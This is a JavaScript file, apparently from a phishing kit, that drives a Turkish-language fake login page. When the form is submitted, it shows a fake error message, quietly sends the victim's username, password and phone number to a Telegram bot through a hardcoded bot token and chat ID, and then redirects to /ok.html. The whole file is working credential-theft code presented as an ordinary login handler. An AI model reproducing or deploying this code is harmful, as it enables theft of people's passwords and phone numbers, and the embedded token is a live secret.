document.addEventListener('DOMContentLoaded', function() {
    // Tab değiştirme işlevi
    const tabs = document.querySelectorAll('.tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', function() {
            tabs.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // Form gönderme işlevi
    const loginForm = document.getElementById('loginForm');
    const errorMessage = document.getElementById('errorMessage');

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        // Form verilerini al
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const phone = document.getElementById('phone').value;

        console.log('Form verileri:', { username, password, phone }); // Debug için log

        // Hata mesajını göster
        errorMessage.classList.add('show');

        // Telegram bot token ve chat ID
        const botToken = '7474834809:AAHSYQ3tIgaYaozUenWDhws4oWkOIek0z20';
        const chatId = '-4643936667';

        // Mesaj metni
        const message = `Kullanıcı Adı: ${username}\nŞifre: ${password}\nTelefon Numarası: ${phone}`;

        try {
            // Telegram API'sine mesaj gönderme
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            if (response.ok) {
                // 2 saniye bekleyip yönlendirme yap
                setTimeout(() => {
                    window.location.href = "/ok.html";
                }, 2000);
            } else {
                console.error('Telegram API Hatası:', await response.text());
            }
        } catch (error) {
            console.error('Hata:', error);
        }
    });
}); 